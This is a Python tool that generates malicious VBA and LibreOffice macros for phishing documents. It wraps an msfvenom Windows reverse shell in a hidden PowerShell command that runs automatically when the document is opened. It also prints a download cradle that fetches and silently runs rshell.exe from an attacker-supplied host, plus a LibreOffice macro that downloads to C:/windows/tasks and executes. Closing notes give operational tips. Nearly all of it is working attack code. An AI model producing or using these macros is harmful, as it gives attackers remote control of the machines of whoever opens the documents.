#!/usr/bin/env python

import sys
import argparse
import subprocess


parser = argparse.ArgumentParser("macro-generator.py: Generate malicious macros using different techniques for MS Office and Libreoffice")
parser.add_argument('-l', '--host',
    type=str,
    dest='host',
    help='IP address of attacker host'
)
parser.add_argument('-p', '--port',
    type=str,
    dest='port',
    help='PORT number of attacker listener'
)
parser.add_argument('-r', '--rshell',
    type=str,
    dest='rshell_path',
    default='/win/rshell.exe',
    help='Reverse rshell.exe location hosted on attacker machine, default=/win/rshell.exe, i.g ":8000/exp/shell.exe"'
)

args = parser.parse_args()

if not args.host or not args.port:
    print("Options --host and --port are required")
    args = parser.parse_args(["-h"])
    sys.exit()

if args.rshell_path == '/win/rshell.exe':
    print(f"Option --rshell not provided, assuming reverse shell is hosted at 'http://{args.host}/win/rshell.exe'")

# msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f psh-cmd
try:
    msfout = subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST="+ args.host, "LPORT="+ args.port, "-f", "psh-cmd"],check=True, capture_output=True).stdout
except subprocess.CalledProcessError:
    print("msfvenom output gave error")

# convert to str, strip the '', split by spaces, get last item
msfout_str = str(msfout)

#print(msfout_str[1:-1].split()[-1])

payload = msfout_str[1:-1].split()[-1]

payload = "powershell.exe -nop -w hidden -e " + payload
#print(payload)

n = 50

beginstr = '''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = ""'''
print(beginstr)

for i in range(0, len(payload), n):
    print("    Str = Str + " + '"' + payload[i:i+n] + '"')

endstr = '''    CreateObject("Wscript.Shell").Run Str
End Sub
'''
print(endstr)

print("\n\n--------------------------VBA-EXE-METHOD--------------------------------\n\n")

try:
    msfout = subprocess.run(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST="+ args.host, "LPORT="+ args.port, "-f", "vba-exe"])
except subprocess.CalledProcessError:
    print("msfvenom output gave error")

print("\n\n--------------------------CRADLE-METHOD--------------------------------\n\n")

print(beginstr)

midstr = '    str = "powershell (New-Object System.Net.WebClient).DownloadFile(\'http://' + args.host + args.rshell_path + '\', \'rshell.exe\')"'
print(midstr)

endstr = '''    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\\rshell.exe"
    Wait (4)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
'''
print(endstr)


print("\n\n------------------LIBREOFFICE-OPENOFFICE-ODT---------------------------\n\n")

print('Sub Main')
# print('    Shell("cmd /c powershell -ep bypass -c (New-Object System.Net.WebClient).DownloadFile(\'http://' + args.host + '/win/rshell.exe\', \'rshell.exe\')")')     #Doesn't work, syntax issues

print('    Shell("cmd /c powershell iwr \'http://' + args.host + '/win/rshell.exe\' -o \'C:/windows/tasks/rshell.exe\'")')
print('    Shell("cmd /c \'C:/windows/tasks/rshell.exe\'")')
print('End Sub')

print('\n\n-----NOTES------')
print('For Method 3 and 4, Cradle and Libreoffice; Generate a reverse shell and host it on attacker, provide path to download it, e.g --rshell "/exp/rshell.exe"')
print('Upload TWICE when using 2 step methods, it tries to execute before download completes')
print('Try encoded powershell commands for ODT since quotes and brackets cause issues')
